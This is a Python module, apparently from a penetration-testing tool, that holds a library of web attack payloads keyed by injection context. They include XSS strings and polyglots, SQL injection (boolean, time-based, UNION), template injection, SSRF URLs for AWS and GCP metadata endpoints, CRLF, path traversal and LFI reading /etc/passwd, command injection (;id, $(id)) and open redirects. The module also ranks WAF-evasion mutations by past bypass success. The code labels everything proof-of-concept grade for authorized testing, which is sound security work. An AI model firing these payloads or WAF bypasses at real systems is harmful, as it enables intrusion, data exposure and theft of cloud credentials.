"""
Context-aware PoC payload library + WAF-adaptive selection (attack section, suggestion #3).

Upgrades blind mutation into CONTEXT-aware selection: payloads are chosen for where they land (HTML
body / attribute / JS string / URL / SQL / header / path), then optionally mutated (reusing the
existing `hydra.payload_engine.PayloadMutator`) and re-ranked by which mutations have historically
bypassed a given WAF (a small in-memory, deterministic feedback loop — no new store).

SAFETY: every payload here is **detection / proof-of-concept grade** — XSS pops `alert(document.domain)`,
SQLi proves with boolean/time/`version()` (never mass-dump), cmdi proves with `id`/`whoami` (never
destructive). There are deliberately NO data-exfiltration, destruction, or DoS payloads. Deterministic,
offline; generation only (sending is the gated executor's job).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional


class VulnClass(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    SSTI = "ssti"
    SSRF = "ssrf"
    CRLF = "crlf"
    PATH_TRAVERSAL = "path_traversal"
    CMDI = "cmdi"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"
    LFI = "lfi"


class PayloadContext(str, Enum):
    HTML_BODY = "html_body"
    HTML_ATTR = "html_attr"
    JS_STRING = "js_string"
    URL = "url"
    SQL = "sql"
    HEADER = "header"
    PATH = "path"
    ANY = "any"


@dataclass
class Payload:
    value: str
    vuln_class: str
    context: str
    technique: str          # what it proves
    poc: bool = True        # detection/PoC grade (always true in this library)
    oob: bool = False

    def to_dict(self) -> Dict:
        return {"value": self.value, "vuln_class": self.vuln_class, "context": self.context,
                "technique": self.technique, "poc": self.poc, "oob": self.oob}


# Curated PoC payloads keyed by (vuln_class, context). Detection/PoC only.
_LIB: Dict[VulnClass, Dict[PayloadContext, List[tuple]]] = {
    VulnClass.XSS: {
        PayloadContext.HTML_BODY: [
            ("<script>alert(document.domain)</script>", "script-tag injection"),
            ("<img src=x onerror=alert(document.domain)>", "event-handler injection"),
            ("<svg/onload=alert(document.domain)>", "svg onload"),
        ],
        PayloadContext.HTML_ATTR: [
            ("\"><img src=x onerror=alert(document.domain)>", "attribute breakout"),
            ("' autofocus onfocus=alert(document.domain) x='", "attribute event handler"),
        ],
        PayloadContext.JS_STRING: [
            ("';alert(document.domain);//", "js single-quote breakout"),
            ("\";alert(document.domain);//", "js double-quote breakout"),
        ],
        PayloadContext.URL: [
            ("javascript:alert(document.domain)", "javascript: uri"),
        ],
    },
    VulnClass.SQLI: {
        PayloadContext.SQL: [
            ("' OR '1'='1", "boolean true (auth/logic)"),
            ("' AND SLEEP(5)-- -", "time-based blind (MySQL)"),
            ("' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", "time-based subquery"),
            ("' UNION SELECT @@version-- -", "version disclosure PoC (MySQL)"),
            ("' UNION SELECT version()-- -", "version disclosure PoC (Postgres)"),
        ],
    },
    VulnClass.SSTI: {
        PayloadContext.ANY: [
            ("{{7*7}}", "jinja2/twig arithmetic"),
            ("${7*7}", "freemarker/jsp el"),
            ("#{7*7}", "ruby/thymeleaf"),
            ("<%= 7*7 %>", "erb"),
        ],
    },
    VulnClass.SSRF: {
        PayloadContext.URL: [
            ("http://169.254.169.254/latest/meta-data/", "aws imds PoC"),
            ("http://metadata.google.internal/computeMetadata/v1/", "gcp metadata PoC"),
            ("http://127.0.0.1:80/", "loopback reach PoC"),
        ],
    },
    VulnClass.CRLF: {
        PayloadContext.HEADER: [
            ("%0d%0aSet-Cookie:crlf=poc", "header injection PoC"),
        ],
    },
    VulnClass.PATH_TRAVERSAL: {
        PayloadContext.PATH: [
            ("../../../../etc/passwd", "unix traversal PoC"),
            ("..%2f..%2f..%2fetc%2fpasswd", "encoded traversal"),
        ],
    },
    VulnClass.LFI: {
        PayloadContext.PATH: [
            ("/etc/passwd", "unix lfi PoC"),
            ("php://filter/convert.base64-encode/resource=index.php", "php wrapper PoC"),
        ],
    },
    VulnClass.CMDI: {
        PayloadContext.ANY: [
            (";id", "command separator PoC (id)"),
            ("|whoami", "pipe PoC (whoami)"),
            ("$(id)", "subshell PoC (id)"),
        ],
    },
    VulnClass.OPEN_REDIRECT: {
        PayloadContext.URL: [
            ("//evil.example.com", "scheme-relative redirect PoC"),
            ("https://evil.example.com", "absolute redirect PoC"),
        ],
    },
}

# Multi-context polyglots (valid in several injection contexts at once).
_POLYGLOTS = {
    VulnClass.XSS: ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//",
                    "'\"><svg/onload=alert(document.domain)>"],
}


@dataclass
class WafFeedback:
    """Deterministic, in-memory record of which mutation strategies bypassed which WAF profile."""
    bypass: Dict[str, Dict[str, int]] = field(default_factory=dict)

    def record(self, waf: str, strategy: str, bypassed: bool) -> None:
        d = self.bypass.setdefault(waf or "unknown", {})
        d[strategy] = d.get(strategy, 0) + (1 if bypassed else 0)

    def rank(self, waf: str) -> List[str]:
        d = self.bypass.get(waf or "unknown", {})
        return [s for s, _ in sorted(d.items(), key=lambda kv: (-kv[1], kv[0]))]


class PayloadLibrary:
    def __init__(self, feedback: Optional[WafFeedback] = None):
        self.feedback = feedback or WafFeedback()

    def for_context(self, vuln_class: VulnClass, context: PayloadContext = PayloadContext.ANY,
                    include_polyglots: bool = True) -> List[Payload]:
        ctxs = _LIB.get(vuln_class, {})
        out: List[Payload] = []
        wanted = [context] if context != PayloadContext.ANY else list(ctxs.keys())
        # ANY-context payloads always apply; merge them in.
        for c in dict.fromkeys(wanted + [PayloadContext.ANY]):
            for value, technique in ctxs.get(c, []):
                out.append(Payload(value, vuln_class.value, c.value, technique))
        if include_polyglots:
            for value in _POLYGLOTS.get(vuln_class, []):
                out.append(Payload(value, vuln_class.value, "polyglot", "multi-context polyglot"))
        # de-dup preserving order
        seen, uniq = set(), []
        for p in out:
            if p.value not in seen:
                seen.add(p.value)
                uniq.append(p)
        return uniq

    def waf_adapted(self, payload: str, waf: str = "") -> List[str]:
        """Mutate a payload (reusing PayloadMutator), ordered by historical bypass success for `waf`.

        Strategies are applied ONE AT A TIME in a deterministic, WAF-ranked order (the underlying
        mutator de-dupes via a set, so applying per-strategy keeps the overall order stable)."""
        from hydra.payload_engine import MutationStrategy, PayloadMutator
        mutator = PayloadMutator()
        ranked = self.feedback.rank(waf)
        # `case_swap` / `whitespace` use randomness in the underlying mutator → excluded so the layer
        # stays deterministic / rebuild-identical (the deterministic encoders cover WAF evasion here).
        nondet = {"case_swap", "whitespace"}
        strategies = sorted((s for s in MutationStrategy if s.value not in nondet),
                            key=lambda s: (ranked.index(s.value) if s.value in ranked else 999,
                                           s.value))
        out, seen = [payload], {payload}
        for s in strategies:
            for v in sorted(mutator.apply_mutations(payload, [s])):
                if v not in seen:
                    seen.add(v)
                    out.append(v)
        return out

    def report(self, vuln_class: VulnClass, context: PayloadContext = PayloadContext.ANY) -> Dict:
        ps = self.for_context(vuln_class, context)
        return {"vuln_class": vuln_class.value, "context": context.value,
                "payloads": [p.to_dict() for p in ps], "count": len(ps),
                "note": "detection / proof-of-concept grade only — no exfiltration / destruction",
                "advisory": True}
